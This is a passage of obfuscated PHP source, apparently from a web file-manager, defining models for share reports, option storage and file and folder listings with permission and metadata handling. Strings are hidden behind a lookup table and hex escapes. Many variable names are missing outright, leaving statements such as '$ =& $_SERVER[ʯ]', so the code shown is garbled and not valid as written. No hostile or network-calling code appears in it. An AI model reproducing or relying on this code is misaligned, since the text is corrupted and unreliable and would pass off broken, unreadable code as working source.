_listDataApply(&$Ƀ) { $ =& $_SERVER[ʯ]; $ = array_to_keyvalue($Ƀ, $[12], $[1704]); $󻉼 = Model($[575])->userListInfo(array_unique($)); $ڭ = array_to_keyvalue($Ƀ, $[12], $[190]); $՜ = Model($[885])->sourceListInfo($ڭ, !0); foreach ($Ƀ as $ь => &$) { $ = $[$[1704]]; $[$[2068]] = $󻉼[$] ? $󻉼[$] : !1; $ڮ = $[$[190]]; $[$[97]] = $՜[$ڮ] ? $՜[$ڮ] : !1; if ($[$[97]][$[481]] == $[98]) { unset($Ƀ[$ь]); } if ($[$[97]] != $[221] && !$[$[97]]) { unset($Ƀ[$ь]); } } unset($); $Ƀ = array_values($Ƀ); } private function _makeOrder($ǀ = '') { $Ӌ =& $_SERVER[ʯ]; $ΐ = array($Ӌ[224], $Ӌ[821], $Ӌ[2055], $Ӌ[2056]); $ = array($Ӌ[499] => $Ӌ[500], $Ӌ[501] => $Ӌ[502]); $דߩ = Input::get($Ӌ[506], $Ӌ[7], $Ӌ[473], $ΐ); $բݨ = Input::get($Ӌ[507], $Ӌ[7], $Ӌ[2069], array($Ӌ[1987], $Ӌ[501])); $բݨ = $[$բݨ]; $ǀ = $ǀ . "{$דߩ}\x20{$բݨ}"; return $this->order($ǀ); } public function reportAdd($) { $ =& $_SERVER[ʯ]; $ۗ = array($[641] => $[$[641]], $[1704] => USER_ID); if (Model($[2065])->where($ۗ)->find()) { return !1; } $ = array($[641] => $[$[641]], $[1601] => $[$[1601]], $[190] => $[$[190]], $[517] => $[$[517]], $[1704] => USER_ID, $[43] => $[$[43]], $[502] => $[$[502]]); return Model($[2065])->add($); } public function reportList($ڟ) { $ =& $_SERVER[ʯ]; $Ϟ = array(); if ($ڟ[$[820]]) { $ = $ڟ[$[821]] ? $ڟ[$[821]] : strtotime(date($[2067])); $Ϟ[$[224]] = array($[385], array($ڟ[$[820]], $)); } if (isset($ڟ[$[43]]) && in_array($ڟ[$[43]], array($[98], $[486], $[2070], $[2071], $[2072]))) { $Ϟ[$[43]] = $ڟ[$[43]]; } if (isset($ڟ[$[810]]) && in_array($ڟ[$[810]], array($[221], $[98], $[486], $[2070]))) { $Ϟ[$[810]] = $ڟ[$[810]]; } $׿ؚ = Input::get($[507], $[7], $[2069], array($[1987], $[501])); $ = array($[499] => $[500], $[501] => $[502]); $٨ = $[2073] . $[$׿ؚ]; $ǯ = Model($[2065])->where($Ϟ)->order($٨)->selectPage(20); if (empty($ǯ[$[421]])) { return array(); } $ = array_to_keyvalue_group($ǯ[$[421]], $[810], $[641]); if (!empty($[0])) { $ڟ = $[0]; $Ϟ = array($[641] => array($[7], $ڟ)); $ω = $this->where($Ϟ)->field($[641])->select(); $ω = array_to_keyvalue($ω, $[12], $[641]); $ھ = array_diff($ڟ, $ω); if (!empty($ھ)) { foreach ($ǯ[$[421]] as $㩯 => $) { if (in_array($[$[641]], $ھ)) { unset($ǯ[$[421]][$㩯]); } } } } $this->_listDataApply($ǯ[$[421]]); return $ǯ; } public function reportStatus($) { $ =& $_SERVER[ʯ]; $ = array($[451] => $[$[451]]); $ŭ = Model($[2065])->where($)->field($[2074])->find(); if (!$ŭ) { return !1; } $ = array($[810] => $[$[810]]); if ($[$[810]] == $[2070] && $ŭ[$[810]] == $[2070]) { $[$[810]] = 0; } $î = Model($[2065])->where($)->save($); if ($[$[810]] == $[486]) { if ($ŭ[$[517]] != $[221] && $this->shareFileMeta($ŭ[$[517]])) { $this->shareFileMeta($ŭ[$[517]], 0); } $this->remove($ŭ[$[641]]); return !0; } if ($î && $[$[810]] == $[2070]) { $ = $[$[810]] == $[2070] ? 1 : 0; $this->shareFileMeta($ŭ[$[517]], $); $this->removeByFile($ŭ[$[517]]); } return $î; } private function removeByFile($تԩ) { $뱝 =& $_SERVER[ʯ]; $ = Model($뱝[885])->where(array($뱝[517] => $تԩ))->field($뱝[190])->select(); $ = array_to_keyvalue($, $뱝[12], $뱝[190]); $ = array($뱝[190] => array($뱝[7], $), $뱝[538] => 1); $ = $this->where($)->field($뱝[641])->select(); if (empty($)) { return; } $ = array_to_keyvalue($, $뱝[12], $뱝[641]); $this->remove($); } private function shareFileMeta($с, $ǆ = null) { $ѡ =& $_SERVER[ʯ]; $ = array($ѡ[517] => $с, $ѡ[104] => $ѡ[2075]); if (is_null($ǆ)) { return Model($ѡ[2076])->where($)->find(); } $[$ѡ[426]] = $ǆ; Model($ѡ[2076])->add($, array(), !0); } } goto fݴ; B򾫿: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\x74\x65\x6d\117\160\x74\151\x6f\x6e"; public $field = array(); public function listData($ŗ = false, $ = "\155\157\144\151\146\171\124\x69\x6d\x65", $ = false) { $Š = Model($this->modelType)->get(!1, $this->optionType, !0); $ = array_values($Š); if ($ && $[0] && !is_array($[0])) { Model($this->modelType)->cacheRemove($this->optionType); $Š = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$Š) { return $ŗ ? null : array(); } if (!$ŗ) { $Š = array_filter(array_values($Š)); return array_sort_by($Š, $, $); } return $Š[$_SERVER[ʯ][448] . $ŗ]; } public function insert($៫) { $ᦽ =& $_SERVER[ʯ]; $៫ = array_field_key($៫, $this->field); $ = Model($this->modelType)->get($ᦽ[449], $this->optionType . $ᦽ[450]); $ = $ ? $ : 0; $៫[$ᦽ[451]] = ++$; $៫[$ᦽ[224]] = time(); $៫[$ᦽ[95]] = time(); Model($this->modelType)->set($ᦽ[449], $, $this->optionType . $ᦽ[450]); Model($this->modelType)->set($ᦽ[448] . $, $៫, $this->optionType); return $; } public function update($, $횁) { $ݖ =& $_SERVER[ʯ]; $횁 = array_field_key($횁, $this->field); $ = $this->listData($); if (!$ || !$) { return !1; } $횁 = array_merge($, $횁); $횁[$ݖ[95]] = time(); return Model($this->modelType)->set($ݖ[448] . $, $횁, $this->optionType); } public function remove($Ť) { if (!$Ť) { return !1; } return Model($this->modelType)->remove($_SERVER[ʯ][448] . $Ť, $this->optionType); } public function clear() { $њ =& $_SERVER[ʯ]; Model($this->modelType)->remove($њ[449], $this->optionType . $њ[450]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($, $ɥ) { if (!$ɥ) { return !1; } $ᬊ = $this->listData(); $ᬊ = array_to_keyvalue($ᬊ, $); return isset($ᬊ[$ɥ]) ? $ᬊ[$ɥ] : !1; } public function findByName($) { return $this->findByKey($_SERVER[ʯ][42], $); } protected function resetData($Ӝٿ) { $݈ =& $_SERVER[ʯ]; $Ӝٿ = is_array($Ӝٿ) ? $Ӝٿ : array(); $ = array(); for ($ = 0; $ < count($Ӝٿ); $++) { $[$݈[448] . $Ӝٿ[$][$݈[451]]] = $Ӝٿ[$]; } return Model($this->modelType)->set($, !1, $this->optionType); } private function getAutoName($) { $ = array_to_keyvalue($this->listData(), $_SERVER[ʯ][42]); if (!$ || !isset($[$])) { return $; } for ($჌ = 1; $჌ < count($); $჌++) { $ɶܺ = $ . "\50{$჌}\x29"; if (!isset($[$ɶܺ])) { return $ɶܺ; } } return $ɶܺ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ = false, $ٯ = '', $ = false) { $ =& $_SERVER[ʯ]; $ = $this->cacheGet($ٯ); $ˠ = $this->optionDefault($ٯ); $ˠ = is_array($ˠ) ? $ˠ : array(); if (is_array($)) { $ = array_merge($ˠ, $); return $ ? isset($[$]) ? $[$] : null : $; } $뀔 = $this->filterWhere(array($[43] => $ٯ)); $ = $this->where($뀔)->select(); $ = array_to_keyvalue($, $[104], $[426]); foreach ($ as $ֳ => $ú) { if ($ || in_array($ֳ, $this->jsonField)) { $[$ֳ] = json_decode($ú, !0); } } $this->cacheSet($ٯ, $); $ = array_merge($ˠ, $); return $ ? $[$] : $; } public function set($զ, $ē = false, $ꋃ = '') { $ʹ =& $_SERVER[ʯ]; $this->cacheRemove($ꋃ); $ = array(); $͹ = is_array($զ) ? $զ : array($զ => $ē); foreach ($͹ as $Ȧ => $̓) { if (is_array($̓)) { $̓ = json_encode_force($̓); } $this->checkLength($̓, !1, $this->tableName . $ʹ[4] . $զ); $̓ = self::textEncode($̓); $͹ = array($ʹ[43] => $ꋃ, $ʹ[104] => $Ȧ, $ʹ[426] => $̓); $[] = $this->filterWhere($͹); } if (!$) { return !0; } $ = $this->cacheKey($ʹ[452]); CacheLock::lock($); $؎ = $this->addAll($, array(), !0); CacheLock::unlock($); return $؎; } protected function optionDefault($߅ = '') { return !1; } public function setDeep($揫, $ݔ = false, $ = '') { $ = explode($_SERVER[ʯ][10], $揫); $ = $this->get(); array_set_value($, $揫, $ݔ); $this->set($[0], $[$[0]], $); } public function remove($Ȩ, $ = '') { $ȝ =& $_SERVER[ʯ]; $this->cacheRemove($); $ = $this->filterWhere(array($ȝ[104] => $Ȩ, $ȝ[43] => $)); if (is_null($Ȩ)) { unset($[$ȝ[104]]); } return $this->where($)->delete(); } public function cacheSet($, $ = false) { return Cache::set($this->cacheKey($), $); } public function cacheGet($ɤ) { return Cache::get($this->cacheKey($ɤ)); } public function cacheRemove($) { return Cache::remove($this->cacheKey($)); } protected function filterWhere($卶) { return $卶; } protected function cacheKey($) { return $; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\x72\143\x65"; protected $tableMeta = array("\x74\x61\142\x6c\x65\116\x61\155\x65" => "\151\157\137\163\157\x75\162\143\x65\137\155\x65\164\x61", "\155\x65\x74\141\106\x69\x65\x6c\144" => "\x73\157\x75\x72\143\x65\111\x44"); protected $dataAuto = array(array("\x6d\x6f\x64\x69\x66\171\x54\151\155\145", "\164\151\155\145", "\151\x6e\x73\x65\x72\164", "\146\165\x6e\x63\x74\x69\157\156"), array("\x63\162\x65\141\164\x65\124\x69\155\145", "\164\x69\x6d\145", "\151\156\163\x65\162\164", "\x66\165\x6e\143\x74\x69\157\156"), array("\166\x69\145\x77\124\x69\x6d\x65", "\164\151\x6d\145", "\x69\156\163\145\162\x74", "\146\165\156\x63\x74\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($呴) { return $this->listSource(array($_SERVER[ʯ][453] => $呴)); } public function typeName($Ԭޯ) { static $׭뙋 = array(self::TYPE_SYSTEM => "\163\171\163\x74\145\155", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\x67\x72\157\x75\160"); return $׭뙋[$Ԭޯ . $_SERVER[ʯ][12]]; } public function sourceListInfo($ⶅ, $ = false) { $ =& $_SERVER[ʯ]; $ⶅ = $ⶅ ? $ⶅ : array(); $ⶅ = array_filter(array_unique($ⶅ)); if (!$ⶅ) { return array(); } $į = $this->where(array($[190] => array($[7], $ⶅ)))->select(); $this->_listDataApply($į, $); return array_to_keyvalue($į, $[190]); } public function pathInfoFilter(&$Ԓ͒) { $ =& $_SERVER[ʯ]; static $ = false; static $ن = false; static $٢ = false; if (!$) { $Ị֬ = $[454]; $Ị֬ .= $[455]; $Ị֬ .= $[456]; $ = $[457]; $ü = explode($[60], $); $ = explode($[60], $Ị֬); $ن = array(); foreach ($ as $) { if (in_array($, $ü)) { continue; } $ن[] = $; } $٢ = explode($[60], $[458]); } foreach ($٢ as $Į) { if (isset($Ԓ͒[$Į])) { $Ԓ͒[$Į] = intval($Ԓ͒[$Į]); } } $Ԓ͒[$[94]] = $[459] . $Ԓ͒[$[190]] . $[460]; $Ԓ͒[$[43]] = $Ԓ͒[$[461]] == 1 ? $[85] : $[223]; $Ԓ͒[$[187]] = $this->typeName($Ԓ͒[$[187]]); if ($Ԓ͒[$[461]] != 1) { $Ԓ͒[$[184]] = $Ԓ͒[$[462]]; unset($Ԓ͒[$[462]]); } $羽 = $; if (isset($Ԓ͒[$[463]]) && $Ԓ͒[$[463]][$[464]] == -1) { $羽 = $ن; } $Ԓ͒ = array_field_key($Ԓ͒, $羽); return $Ԓ͒; } public function listUserFav() { $х̪ =& $_SERVER[ʯ]; $׮ = Model($х̪[465])->listData(); $הҁ = array_filter_by_field($׮, $х̪[43], $х̪[466]); $הҁ = array_to_keyvalue($הҁ, $х̪[12], $х̪[94]); if ($הҁ) { $ = $this->listSource(array($х̪[467] => array($х̪[468], $הҁ))); } $ = array_to_keyvalue($[$х̪[421]], $х̪[190]); foreach ($׮ as &$˽) { $˽ = array($х̪[469] => $˽[$х̪[451]], $х̪[470] => $˽[$х̪[42]], $х̪[471] => $˽[$х̪[94]], $х̪[472] => $˽[$х̪[43]], $х̪[473] => $˽[$х̪[224]], $х̪[474] => $˽[$х̪[95]]); if ($˽[$х̪[43]] == $х̪[466] && $[$˽[$х̪[94]]]) { $˽[$х̪[97]] = $[$˽[$х̪[94]]]; } } unset($˽); return $׮; } public function listUserTag($Ɏ) { $ѓ =& $_SERVER[ʯ]; if ($Ɏ && !is_array($Ɏ)) { $Ɏ = array($Ɏ); } $ = Model($ѓ[475])->listData(); $ = array(); $ = array(); foreach ($ as $Ęϥ) { $Ӕ = $Ęϥ[$ѓ[94]]; if (!$Ӕ) { continue; } if (!isset($[$Ӕ])) { $[$Ӕ] = array(); } $[$Ӕ][] = $Ęϥ[$ѓ[476]]; $[$Ęϥ[$ѓ[94]]] = $Ęϥ; } $· = array(); $ư斷 = array(); $Ӱ = array(); foreach ($ as $ݹ => $׷) { $̅ڛ = !0; if (!$Ɏ) { $·[] = $ݹ; continue; } foreach ($Ɏ as $) { if (!in_array($, $׷)) { $̅ڛ = !1; break; } } if (!$̅ڛ) { continue; } if (!is_numeric($ݹ)) { $䁽 = $[$ݹ]; $ʯ = array($ѓ[42] => $䁽[$ѓ[42]], $ѓ[94] => $䁽[$ѓ[94]], $ѓ[43] => $䁽[$ѓ[43]], $ѓ[97] => array($ѓ[477] => 1), $ѓ[225] => !0); if ($䁽[$ѓ[43]] == $ѓ[223]) { $Ӱ[] = $ʯ; } if ($䁽[$ѓ[43]] == $ѓ[85]) { $ư斷[] = $ʯ; } continue; } $·[] = $ݹ; } if ($·) { $ = $this->listSource(array($ѓ[467] => array($ѓ[468], $·))); } $ = $ ? $ : array($ѓ[92] => array(), $ѓ[93] => array()); $[$ѓ[92]] = array_merge($[$ѓ[92]], $ư斷); $[$ѓ[93]] = array_merge($[$ѓ[93]], $Ӱ); if (isset($[$ѓ[418]]) && count($·) == $[$ѓ[418]][$ѓ[419]]) { return $; } $˰ = array(); $ = array_to_keyvalue($[$ѓ[92]], $ѓ[12], $ѓ[190]); $ = array_to_keyvalue($[$ѓ[93]], $ѓ[12], $ѓ[190]); $靈 = array_merge($, $); foreach ($· as $Ӕ) { if (!in_array($Ӕ, $靈)) { $˰[] = $Ӕ; } } if ($˰) { Model($ѓ[478])->removeBySource($˰); } return $; } public function listUserRecycle() { $ =& $_SERVER[ʯ]; $ˋ = Model($[479])->listData(); if (!$ˋ) { return array(); } $ƨ = array($[467] => array($[468], $ˋ), $[480] => 1); return $this->listSource($ƨ); } public function listSource($џ, $կ = 3000, $ݙ = false) { $ =& $_SERVER[ʯ]; if (!isset($џ[$[481]])) { $џ[$[481]] = 0; } if (isset($џ[$[189]]) && $џ[$[189]] == $[221]) { $џ[$[462]] = array($[383], $[482]); } $Ω = $[483]; $ = $this->field($Ω)->_makeOrder()->where($џ)->selectPage($կ); $this->_listPageCheck($, $Ω, $џ); $this->_listDataApply($[$[421]], $ݙ); $this->_listMake($); return $; } private function _listPageCheck(&$ү, $֗, $ϒ) { $ʦ =& $_SERVER[ʯ]; if (!is_array($ү[$ʦ[418]])) { return; } $ = $ү[$ʦ[418]]; if ($[$ʦ[420]] <= 1) { return; } if ($[$ʦ[419]] >= 100000) { return; } if (Model($ʦ[484])->get($ʦ[485]) != $ʦ[486]) { return; } $֗ = str_replace(array($ʦ[63], $ʦ[394], $ʦ[18]), $ʦ[12], $֗); $֗ = $ʦ[487] . str_replace($ʦ[60], $ʦ[488], $֗) . $ʦ[489]; $۠ = $ʦ[490]; $۠ = $۠ . $ʦ[491]; $ = $[$ʦ[415]] * ($[$ʦ[405]] - 1) . $ʦ[60] . $[$ʦ[415]]; $ = $this->_makeOrder(!0); $ = $ʦ[487] . str_replace($ʦ[60], $ʦ[488], $[0]); if (strpos($, $ʦ[492])) { $ = str_replace($ʦ[492], $ʦ[493], $); } else { $ .= $ʦ[494] . $[1]; } $؟ = array(); foreach ($ϒ as $ߓ => $) { $؟[$ʦ[487] . $ߓ] = $; } $this->alias($ʦ[495])->field($֗)->limit($)->order($); $ǽϋ = $this->join($۠)->where($؟)->select(); if ($ǽϋ) { $ү[$ʦ[421]] = $ǽϋ; } } protected function _makeOrder($م× = false) { $خ =& $_SERVER[ʯ]; $̏ = Model($خ[496])->get($خ[497]); $蛓 = Model($خ[496])->get($خ[498]); $ɴѺ = array($خ[499] => $خ[500], $خ[501] => $خ[502]); $쿊 = array($خ[42] => $خ[42], $خ[86] => $خ[86], $خ[184] => $خ[462], $خ[503] => $خ[503], $خ[504] => $خ[505], $خ[224] => $خ[224], $خ[95] => $خ[95]); $֛ = Input::get($خ[506], $خ[7], $̏, array_keys($쿊)); $Ŧ = Input::get($خ[507], $خ[7], $蛓, array_keys($ɴѺ)); if (!in_array($֛, array_keys($쿊))) { $֛ = $خ[42]; } if (!in_array($Ŧ, array_keys($ɴѺ))) { $֛ = $خ[499]; } if ($֛ == $خ[42]) { } $ڋ = $خ[508] . $쿊[$֛] . $خ[63] . $ɴѺ[$Ŧ]; $ڋ = rtrim(trim($ڋ), $خ[60]); if ($م×) { return array($ڋ, $ɴѺ[$Ŧ]); } return $this->order($ڋ); } protected function _listDataApplyItem($ȶϭ, $߁ = false) { $Ҟ = array($ȶϭ); $this->_listDataApply($Ҟ, $߁); return $Ҟ[0]; } protected function _listDataApply(&$щ, $ = false) { $ =& $_SERVER[ʯ]; if (!$щ) { $щ = array(); return; } $ɷ = array_to_keyvalue($щ, $[12], $[190]); $ɷ = array_unique($ɷ); $this->_listSourceCache($щ); if (!$) { $this->_listAppendMeta($щ, $ɷ); $this->_listAppendFileMeta($щ, $ɷ); $this->_listAppendChildren($щ, $ɷ); } $this->_listAppendPath($щ); $this->_listAppendAuth($щ); $this->_listAppendSourceInfo($щ, $ɷ); $this->_listAppendUser($щ); $this->_listFilterInfo($щ, $); $this->_listAppendAuthSecret($щ); } protected function _listSourceCache($) { $ډϘ =& $_SERVER[ʯ]; foreach ($ as $) { self::$cacheSourceInfo[$ډϘ[509] . $[$ډϘ[190]]] = $; } } protected function _listFilterInfo(&$, $է = false) { $њ =& $_SERVER[ʯ]; foreach ($ as &$) { $ = $this->pathInfoFilter($); self::$cachePathInfo[$њ[510] . intval($է) . $њ[438] . $[$њ[190]]] = $; } unset($); } protected function _listMake(&$) { $² =& $_SERVER[ʯ]; $[$²[92]] = array(); $[$²[93]] = array(); foreach ($[$²[421]] as $ҭ) { $噊 = $ҭ[$²[461]] == 1 ? $²[92] : $²[93]; $[$噊][] = $ҭ; } unset($[$²[421]]); } protected function _listAppendMeta(&$Α, $Θ) { $ђ =& $_SERVER[ʯ]; $ב = array($ђ[467] => array($ђ[468], $Θ)); $遤 = Model($ђ[511])->field($ђ[512])->where($ב)->select(); if (!$遤) { return; } $£ = array($ђ[513], $ђ[514], $ђ[493]); $ؑ = array(); foreach ($遤 as $ϩ) { if (!isset($ؑ[$ϩ[$ђ[190]]])) { $ؑ[$ϩ[$ђ[190]]] = array(); } if (in_array($ϩ[$ђ[104]], $£)) { continue; } $ؑ[$ϩ[$ђ[190]]][$ϩ[$ђ[104]]] = $ϩ[$ђ[426]]; } foreach ($Α as &$ݦ) { $ݦ[$ђ[515]] = !1; if (isset($ؑ[$ݦ[$ђ[190]]])) { $ݦ[$ђ[515]] = $ؑ[$ݦ[$ђ[190]]]; } if ($this->fileIsLock($ݦ) && $ݦ[$ђ[463]]) { $Ǥ鄌 = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ݦ[$ђ[463]][$ђ[464]] = AuthModel::authDisable($ݦ[$ђ[463]][$ђ[464]], $Ǥ鄌); $ݦ[$ђ[463]][$ђ[516]][$ђ[463]] = $ݦ[$ђ[463]][$ђ[464]]; } } unset($ݦ); } protected function _listAppendFileMeta(&$܋, $۶״) { $Ѷ =& $_SERVER[ʯ]; $ = array_to_keyvalue($܋, $Ѷ[12], $Ѷ[517]); $ = array_filter(array_unique($)); if (!$) { return; } $ = array($Ѷ[518] => array($Ѷ[468], $)); $ = $Ѷ[519]; $醍 = Model($Ѷ[520])->field($)->where($)->select(); $醍 = array_to_keyvalue($醍, $Ѷ[517]); $ = Model($Ѷ[521])->field($Ѷ[522])->where($)->select(); $ = $ ? $ : array(); $嗿 = array(); foreach ($ as $Φ) { if (!isset($嗿[$Φ[$Ѷ[517]]])) { $嗿[$Φ[$Ѷ[517]]] = array(); } $嗿[$Φ[$Ѷ[517]]][$Φ[$Ѷ[104]]] = $Φ[$Ѷ[426]]; } foreach ($܋ as &$Ưя) { $ = $Ưя[$Ѷ[517]]; if (!$ || !is_array($醍[$])) { continue; } $ = $醍[$]; $[$Ѷ[86]] = $Ưя[$Ѷ[86]]; $[$Ѷ[42]] = $Ưя[$Ѷ[42]]; if (!isset(self::$cacheFileInfo[$Ѷ[523] . $])) { self::$cacheFileInfo[$Ѷ[523] . $] = array_merge(array(), $); } unset($醍[$][$Ѷ[94]]); $빹 = is_array($嗿[$]) ? $嗿[$] : array(); $Ưя[$Ѷ[524]] = array_merge($빹, $醍[$]); if (isset($Ưя[$Ѷ[524]][$Ѷ[180]])) { $Ưя[$Ѷ[180]] = json_decode($Ưя[$Ѷ[524]][$Ѷ[180]], !0); unset($Ưя[$Ѷ[524]][$Ѷ[180]]); } } unset($Ưя); } protected function _listAppendSourceInfo(&$܀, $񅧥) { $ϊ =& $_SERVER[ʯ]; $۱ = Model($ϊ[525])->listData(); $ݍ = Model($ϊ[475])->listData(); $ = Model($ϊ[465])->listData(); $ܝ = Model($ϊ[526])->listSimple(); $ = array_to_keyvalue($۱, $ϊ[451]); $ = array_to_keyvalue_group($ݍ, $ϊ[94], $ϊ[476]); $ = array_to_keyvalue($, $ϊ[94]); $ = array_to_keyvalue_group($ܝ, $ϊ[190]); foreach ($܀ as &$󦊜) { $󦊜[$ϊ[97]] = array($ϊ[527] => 0, $ϊ[528] => 0, $ϊ[529] => 0); if (isset($[$󦊜[$ϊ[190]]])) { $󦊜[$ϊ[97]][$ϊ[530]] = 1; $󦊜[$ϊ[97]][$ϊ[531]] = $[$󦊜[$ϊ[190]]][$ϊ[42]]; } if ($ && $ && isset($[$󦊜[$ϊ[190]]])) { $󦊜[$ϊ[97]][$ϊ[532]] = array(); foreach ($[$󦊜[$ϊ[190]]] as $) { $ = $[$]; $󦊜[$ϊ[97]][$ϊ[532]][] = array($ϊ[533] => $[$ϊ[451]], $ϊ[470] => $[$ϊ[42]], $ϊ[534] => $[$ϊ[535]]); } } if ($ && isset($[$󦊜[$ϊ[190]]])) { $󦊜[$ϊ[97]][$ϊ[536]] = array(); foreach ($[$󦊜[$ϊ[190]]] as $Ų) { $Ƅ = $ϊ[537]; if ($Ų[$ϊ[538]] == $ϊ[98]) { $Ƅ .= $ϊ[539]; } $󦊜[$ϊ[97]][$ϊ[536]] = array_field_key($Ų, explode($ϊ[60], $Ƅ)); } } } unset($󦊜); return $܀; } protected function _listAppendChildren(&$ڃ, $) { $ˈ̥ =& $_SERVER[ʯ]; $↓ = array(); $ŉ = array($ˈ̥[232] => 0, $ˈ̥[233] => 0); foreach ($ڃ as &$) { if (!$[$ˈ̥[461]]) { continue; } $↓[] = $[$ˈ̥[190]]; } unset($); if (!$↓) { return; } $ã = array($ˈ̥[189] => array($ˈ̥[7], $↓), $ˈ̥[481] => 0); $ = array($ˈ̥[189], $ˈ̥[461], $ˈ̥[540] => $ˈ̥[541]); $ק = $this->field($)->where($ã)->group($ˈ̥[542])->select(); $ǽ̇ = array(); foreach ($ק as $ۖ) { $˴ = $ۖ[$ˈ̥[189]]; $ư = $ۖ[$ˈ̥[461]] == $ˈ̥[98] ? $ˈ̥[233] : $ˈ̥[232]; if (!isset($ǽ̇[$˴])) { $ǽ̇[$˴] = array($ˈ̥[232] => 0, $ˈ̥[233] => 0); } $ǽ̇[$˴][$ư] += $ۖ[$ˈ̥[541]]; } foreach ($ڃ as &$) { if (!$[$ˈ̥[461]]) { continue; } $ĕ = is_array($ǽ̇[$[$ˈ̥[190]]]) ? $ǽ̇[$[$ˈ̥[190]]] : $ŉ; $[$ˈ̥[233]] = $ĕ[$ˈ̥[233]]; $[$ˈ̥[232]] = $ĕ[$ˈ̥[232]]; unset($[$ˈ̥[462]]); } unset($); } protected function _listAppendAuth(&$≁ے) { $Җ =& $_SERVER[ʯ]; $ɾ = array(); foreach ($≁ے as $) { if ($[$Җ[187]] == self::TYPE_GROUP) { $ɾ[] = $[$Җ[190]]; } } if (!$ɾ) { return; } $Ҟ = array_to_keyvalue($≁ے, $Җ[190]); $ = Model($Җ[543])->getSourceList($ɾ, $Ҟ); $݁ = $GLOBALS[$Җ[544]] == 1; foreach ($≁ے as $ => &$) { $[$Җ[463]] = $[$[$Җ[190]]]; if (!$[$Җ[463]] && $[$Җ[187]] == self::TYPE_GROUP) { $[$Җ[463]] = Action($Җ[545])->pathGroupAuthMake($[$Җ[546]]); if (!$[$Җ[463]] && !$݁) { $[$Җ[226]] = !1; $[$Җ[225]] = !1; } } if ($[$Җ[463]]) { $[$Җ[226]] = AuthModel::authCheckEdit($[$Җ[463]][$Җ[464]]); $[$Җ[225]] = AuthModel::authCheckView($[$Җ[463]][$Җ[464]]); } $this->groupPathDisplay($); } unset($); } public function _listAppendAuthSecret(&$) { $Ō =& $_SERVER[ʯ]; if (Model($Ō[484])->get($Ō[547]) != $Ō[98]) { return; } static $ = false; if (!$) { $ = Model($Ō[548]); $ΫϹ = Model($Ō[549]); $ = $ΫϹ->listData(); $ = array_to_keyvalue($, $Ō[190]); $Þ = json_decode(Model($Ō[484])->get($Ō[550]), !0); $Þ = array_to_keyvalue($Þ, $Ō[451]); foreach ($ as $񲉣 => $׿Ρ) { $ӱ = $Þ[$׿Ρ[$Ō[551]]]; if (!$ӱ) { $ΫϹ->remove($׿Ρ[$Ō[451]]); unset($[$񲉣]); continue; } $ = $->listData($ӱ[$Ō[463]]); if (!$) { $ΫϹ->remove($׿Ρ[$Ō[451]]); unset($[$񲉣]); continue; } $׿Ρ[$Ō[463]] = $; $׿Ρ[$Ō[552]] = $ӱ; $׿Ρ[$Ō[553]] = Model($Ō[554])->getInfoSimpleOuter($׿Ρ[$Ō[503]]); $[$񲉣] = $׿Ρ; } } $ = USER_ID; $ɶ = array(); $ٰ = $this->_listAppendPath($ɶ, !0); foreach ($ as $񲉣 => &$׿Ρ) { if (!is_array($׿Ρ[$Ō[463]])) { continue; } if ($׿Ρ[$Ō[187]] != $Ō[555]) { continue; } if (isset($[$׿Ρ[$Ō[190]]])) { $ݯ = $[$׿Ρ[$Ō[190]]]; if (!is_array($׿Ρ[$Ō[515]])) { $׿Ρ[$Ō[515]] = array(); } $׿Ρ[$Ō[515]][$Ō[556]] = $ݯ[$Ō[551]]; $׿Ρ[$Ō[463]][$Ō[557]] = $ݯ; $׿Ρ[$Ō[463]][$Ō[558]] = $׿Ρ[$Ō[559]]; $׿Ρ[$Ō[463]][$Ō[560]] = $Ō[98]; if ($ݯ[$Ō[503]] != $) { $׿Ρ[$Ō[463]][$Ō[464]] = $׿Ρ[$Ō[463]][$Ō[464]] & $ݯ[$Ō[463]][$Ō[463]]; } continue; } $ = $this->parentLevelArray($׿Ρ[$Ō[561]]); $ݤ = array_reverse($); foreach ($ݤ as $㫗 => $֦) { if (!isset($[$֦])) { continue; } $ݯ = $[$֦]; $׿Ρ[$Ō[463]][$Ō[557]] = $ݯ; if ($ݯ[$Ō[503]] != $) { $׿Ρ[$Ō[463]][$Ō[464]] = $׿Ρ[$Ō[463]][$Ō[464]] & $ݯ[$Ō[463]][$Ō[463]]; } $Ǵ = $Ō[12]; $ = count($) - $㫗; for ($ = 0; $ < $; $++) { if (!isset($ٰ[$[$]])) { $Ǵ = $Ō[12]; break; } $Ǵ = $Ǵ . rtrim($ٰ[$[$]], $Ō[8]) . $Ō[8]; } $׿Ρ[$Ō[463]][$Ō[558]] = rtrim($Ǵ, $Ō[8]) . $Ō[8]; break; } } unset($׿Ρ); } public function groupPathDisplay(&$) { $ɋ =& $_SERVER[ʯ]; if ($[$ɋ[187]] != self::TYPE_GROUP) { return; } $ = Model($ɋ[562])->getInfo($[$ɋ[546]]); $ = $this->parentLevelArray($[$ɋ[561]]); $م = $ɋ[12]; foreach ($ as $) { $ŝ޻ = Model($ɋ[562])->getInfo($); $م .= $ŝ޻[$ɋ[97]][$ɋ[190]] . $ɋ[60]; } $[$ɋ[563]] = $[$ɋ[189]]; $[$ɋ[564]] = $[$ɋ[561]]; $[$ɋ[565]] = $[$ɋ[566]]; $[$ɋ[567]] = $م . $[$ɋ[97]][$ɋ[190]]; } protected function _listAppendPath(&$׃, $ߴ = false) { $ޥ =& $_SERVER[ʯ]; static $芖ϭ = array(); $ڐ = array(); $ = array(); if ($ߴ) { return $芖ϭ; } foreach ($׃ as &$) { $ܷ = $[$ޥ[190]]; if ($[$ޥ[461]] == $ޥ[98] && $[$ޥ[189]] != 0) { $芖ϭ[$ܷ] = $[$ޥ[42]]; } if ($[$ޥ[461]] == $ޥ[98] && $[$ޥ[189]] == 0) { $芖ϭ[$ܷ] = $this->_listAppendPathRoot($, array()); } if 